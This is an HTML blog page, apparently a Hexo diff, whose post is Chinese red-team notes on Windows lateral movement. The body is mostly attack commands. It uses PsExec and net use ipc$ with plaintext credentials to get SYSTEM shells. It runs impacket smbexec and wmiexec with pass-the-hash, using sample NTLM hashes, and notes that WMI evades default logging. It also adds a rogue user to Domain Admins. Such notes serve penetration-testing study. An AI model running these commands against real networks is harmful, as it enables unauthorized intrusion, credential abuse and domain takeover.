@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <meta name="author" content="Dong Yuanxin">
+  
+  
+  <title>横向移动 | hcncn6</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="内网,">
+  
+
+  
+  <meta name="description" content="hcncn小站">
+
+  
+
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>
+  
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":true},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2018-11-1",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "Dong Yuanxin",
+    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">博客0v0</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | 博客重建中，还有其他细节文章</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/hcncn6" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/categories/" target="_self">
+            分类
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2022-09-05
+    </span>
+    
+      <span>
+        | <a href="/categories/内网/"><i class="fa fa-bookmark"></i>内网</a>
+      </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    横向移动
+  </h1>
+  
+  <article class="passage-article">
+    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">PsExec</span><br><span class="line">	PsExec是SysInternals套件中的一款强大的软件。攻击者通过命令行环境与目标机器进行连接，甚至控制目标机器，而不需要通过远程桌面协议(RDP)进行图形化控制，降低了恶意操作被管理员发现的可能性。</span><br><span class="line"></span><br><span class="line">PsExec的基本原理是：通过管道在远程目标机器上创建一个psexec服务，并在本地磁盘中生成一个名为PSEXESVC的二进制文件，然后通过psexec服务运行命令，运行结束后删除任务。</span><br><span class="line"></span><br><span class="line">	若想要直接获取域控权限的话可以使⽤ PsExec：</span><br><span class="line">	通过 PsExec 可以在远程⽬标主机上执⾏命令，也可以将管理员权限提升到 System 权限以运⾏指定的程序。PsExec 的基本原理是：通过管道在远程⽬标主机上创建⼀个 psexec 服务，并在本地磁盘中⽣成⼀个名为”</span><br><span class="line">PSEXESVC“的⼆进制⽂件，然后通过 psexec 服务运⾏命令，运⾏结束后删除服务。⾸先，需要获取⽬标操作系统的交互式 Shell。在建⽴了 ipc$ 的情况下：</span><br><span class="line"></span><br><span class="line">	psexec使用前提：</span><br><span class="line"></span><br><span class="line">    对方主机开启了 admin$ 共享，如果关闭了admin$共享，会提示：找不到网络名</span><br><span class="line"></span><br><span class="line">    如果是工作组环境，则必须使用administrator用户连接，使用普通用户连接会提示：登录失败: 未授予用户在此计算机上的请求登录类型。。</span><br><span class="line"></span><br><span class="line">	PsExec.exe -accepteula \\AD-2008 -s cmd.exe</span><br><span class="line">	PsExec.exe \\10.10.10.10 -u redteam\admins -p admin!@#45 cmd /c &quot;ipconfig&quot;</span><br><span class="line"></span><br><span class="line">	PsExec.exe \\10.10.10.10 -u redteam\admins -p admin!@#45 cmd.exe</span><br><span class="line"></span><br><span class="line">	其他文</span><br><span class="line">		psexec第一种使用</span><br><span class="line">			：先建立ipc连接，再使用明文或者hash</span><br><span class="line">net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administrator</span><br><span class="line">			psexec \\192.168.3.32 cmd -s</span><br><span class="line">			但在很多情况下，IPC连接会失败，所以推荐使用第二种方式</span><br><span class="line"></span><br><span class="line">		psexec第二种使用</span><br><span class="line"></span><br><span class="line">		：不用建立IPC直接使用明文或hash[推荐]</span><br><span class="line">		psexec \192.168.41.141 -u administrator -p admin1234@ -s cmd</span><br><span class="line">		直接返回system</span><br><span class="line"></span><br><span class="line">		• 配置了非约束性委派的机器账号的userAccountControl属性有个FLAG位 WORKSTATION_TRUST_ACCOUNT |</span><br><span class="line">TRUETED_TO_AUTHENTICATE_FOR_DELEGATION，其对应的数是0x1001000=16781312。</span><br><span class="line"></span><br><span class="line">		失败，但是有解决办法，这里还是使用第三方工具。</span><br><span class="line"></span><br><span class="line">		smbexec</span><br><span class="line"></span><br><span class="line">			 可以通过文件共享（admin，c，ipc，d）在远程系统中执行命令。</span><br><span class="line">smbexec</span><br><span class="line">impacket 工具包中的 smbexec.py</span><br><span class="line"></span><br><span class="line">			下载地址：https://github.com/SecureAuthCorp/impacket</span><br><span class="line">			远程执行目标系统命令：</span><br><span class="line">smbexec.py god.org/administrator:Admin12345\@192.168.2.25</span><br><span class="line">			smbexec 无需先建立ipc 链接，明文或hash传递皆可</span><br><span class="line"></span><br><span class="line">			如果对方没开启445端口，则报如下错：</span><br><span class="line"></span><br><span class="line">			-] [Errno Connection error (xx.xx.xx.xx:445)] [WinError 10060] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝 试失败。</span><br><span class="line"></span><br><span class="line">			如果对方开启了445端口，但是没有开启C$共享，则报如下错：</span><br><span class="line"></span><br><span class="line">			[-]SMB Session Error: STATUS_BAD_NETWORK_NAME(&#123;Network Name Not Found&#125; The specified share name cannot be found on the remote </span><br><span class="line">server.)</span><br><span class="line"></span><br><span class="line">			smbexec ./administrator:admin!@#45@192.168.3.32</span><br><span class="line">			利用hash连接的命令</span><br><span class="line">smbexec -hashes :$HASH$ ./admin@192.168.3.21 </span><br><span class="line">smbbexec -hashes :$HASH$ domain/admin@192.168.3.21 </span><br><span class="line">smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 </span><br><span class="line">smbexec -hashes :ccef208c6485269c20db2cad21734fe7god/administrator@192.168.3.2</span><br><span class="line">			./smbexec.py xie/hack:x123456./@192.168.10.130</span><br><span class="line">./smbexec.py xie/hack@192.168.10.130  -hashes aada8eda23213c027743e6c498d751aa:b98e75b5ff7a3d3ff05e07f211ebe7a8</span><br><span class="line">			然后就加入管理员组了：net localgroup administrators 用户名 /add</span><br><span class="line"></span><br><span class="line">			Linux 跨平台 Windows 远程命令执行</span><br><span class="line">smbexec 工具包下载地址：https://github.com/brav0hax/smbexec.git</span><br><span class="line">下载安装运行脚本：</span><br><span class="line">git clone https://github.com/brav0hax/smbexec.git</span><br><span class="line">cd smbexec/</span><br><span class="line">chmod +x install.sh &amp;&amp; ./install.sh</span><br><span class="line">		再次列出域控制器的C盘目录：</span><br><span class="line">dir \\qianxiao996-dm.qianxiao996.com\C$</span><br><span class="line">		使用PSTools目录下的PsExec.exe获取shell:</span><br><span class="line">PsExec.exe \\qianxiao996-dm.qianxiao996.com cmd.exe</span><br><span class="line">		建立 ipc$ 连接</span><br><span class="line"></span><br><span class="line">		net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; /user:administrator</span><br><span class="line">或者</span><br><span class="line">net use \\192.168.7.7 /u:teamssix.com\administrator &quot;1qaz@WSX&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		在已经建立 ipc$ 的情况下，执行以下命令就可以获得 system 权限</span><br><span class="line">PsExec.exe -accepteula \\192.168.7.7 -s cmd.exe</span><br><span class="line">		-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框</span><br><span class="line">-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell</span><br><span class="line"></span><br><span class="line">如果没有建立 ipc$ 连接，也可以直接使用 PsExec 指定用户名密码进行连接</span><br><span class="line">PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe</span><br><span class="line">		或者执行以下命令直接回显命令结果</span><br><span class="line">PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe /c &quot;ipconfig&quot;</span><br><span class="line">		以域用户登录域成员主机</span><br><span class="line"></span><br><span class="line">域成员主机：192.168.10.130</span><br><span class="line"></span><br><span class="line">    域普通用户：xie\hack  密码：x123456./</span><br><span class="line"></span><br><span class="line">域成员主机可以使用普通域用户登录</span><br><span class="line"></span><br><span class="line">psexec.exe \\192.168.10.130 -u xie\hack -p x123456./ cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		添加域管理员</span><br><span class="line">net user wangergou ABCabc123 /add /domain</span><br><span class="line">net group &quot;Domain admins&quot; wangergou /add /domain</span><br><span class="line">通过 WMIExec 来进⾏横向移动</span><br><span class="line">	通过发现在使⽤ wmiexec 进⾏横向移动时，windows 操作系统默认不会将 WMI 的操作记录在⽇志中。因此很多APT 组织也开始渐渐使⽤ WMI 进⾏攻击。</span><br><span class="line">	python3 wmiexec.py administrator:admin.123@192.168.10.77</span><br><span class="line"></span><br><span class="line">	wmiexec.py 还支持通过哈希传递获得 shell</span><br><span class="line">python3 wmiexec.py -hashes LMHash:NTHash 域名/用户名@目标IP</span><br></pre></td></tr></table></figure>
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: hcncn</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://hcncn6.github.io/2022/09/05/内网/横向移动/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+</div>
+
+    </main>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+      <div class="site-footer-info">
+        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
+      </div>
+    
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <div class="site-layer-input-choose">
+          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
+        </div>
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div class="bottom-bar-left">
+    <a href="/2022/09/05/内网/内网隧道/" data-enable="true">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/2022/09/05/内网/1 - 副本 (3) - 副本 - 副本/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+  
+  
+  
+  
+</div>
+    
+
+
+
+
+
+    
+  </body>
+</html>
